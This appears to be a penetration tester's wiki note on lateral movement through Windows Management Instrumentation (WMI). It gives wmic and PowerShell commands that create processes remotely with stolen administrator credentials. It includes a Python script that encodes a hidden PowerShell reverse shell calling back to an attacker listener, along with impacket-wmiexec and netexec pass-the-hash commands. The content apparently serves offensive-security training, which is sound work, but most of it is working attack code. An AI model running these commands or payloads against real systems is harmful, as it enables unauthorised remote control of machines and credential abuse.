---
title: WMI
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
WMI (Windows Management Instrumentation) exposes a management interface reachable over DCOM (port 135 + a dynamic high port) or, on newer systems, WinRM. Because `Win32_Process.Create` runs a process as the authenticating user, it is a reliable lateral movement primitive once we hold local admin on the target — and it is stealthier than PsExec-style techniques since it does not drop a service binary on disk.

> [!Requirements]
> To create a process on the remote target via WMI, we need the credentials of a member of the _Administrators_ local group, which can also be a domain user.

- Using wmic:
```powershell
C:\> wmic /node:TARGET_IP /user:USER /password:PASSWORD process call create "COMMAND"
```

- Using Powershell:
```powershell
1. Create a PSCredential Object for storing the username and password
PS C:\> $username = 'jen';
PS C:\> $password = 'Nexus123!';
PS C:\> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

2. Create a Common Information Model and define the remote session
PS C:\> $options = New-CimSessionOption -Protocol DCOM
PS C:\> $session = New-Cimsession -ComputerName TARGET_IP -Credential $credential -SessionOption $Options 
PS C:\> $command = 'COMMAND';

3. Invoking the WMI session:
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

For command, use a base64 encoded powershell payload like the following:
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("LOCAL_IP",LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

> [!Note]
> Replace the LOCAL_IP and PORT with the listener on our kali machine.

Run the script:
```bash
python3 encode.py
```

Paste the full command on the $command, setup a listener and start the WMI session

---

# Alternatives from a Linux attack host

Doing this by hand is rarely necessary — several tools wrap the same `Win32_Process.Create` call and, crucially, support **Pass-the-Hash**, so a cracked/dumped NT hash is enough (no plaintext needed):

- Impacket `wmiexec` — semi-interactive shell over WMI (DCOM):
```bash
$ impacket-wmiexec DOMAIN/USER:PASSWORD@TARGET_IP

# Pass-the-Hash:
$ impacket-wmiexec -hashes :NT_HASH DOMAIN/USER@TARGET_IP

# Kerberos ticket (see [[Pass the Ticket (PtT)]]):
$ KRB5CCNAME=ticket.ccache impacket-wmiexec -k -no-pass DOMAIN/USER@TARGET_FQDN
```

- NetExec / CrackMapExec — validate access and run a command across many hosts at once:
```bash
$ netexec wmi TARGET_IP -u USER -p PASSWORD -x "whoami"
$ netexec wmi TARGET_IP -u USER -H NT_HASH -x "whoami"   # Pass-the-Hash
```

> [!Note]
> Generate the base64 payload above (or any command) with the [[Payloads]] / [[Shells]] notes, and start the listener before triggering execution.

# Related notes
- [[Impacket]] — full impacket toolkit (wmiexec/psexec/atexec/smbexec)
- [[Pass the Hash (PtH)]] — reusing NT hashes, which all the tools above support
- [[Pass the Ticket (PtT)]] — Kerberos-based auth (`-k`)
- [[WinRM]] · [[Enter-PSSession]] · [[RDP]] — other lateral movement channels
- [[AD Enumeration - Credentialed - From Linux]] — obtaining the admin creds WMI needs
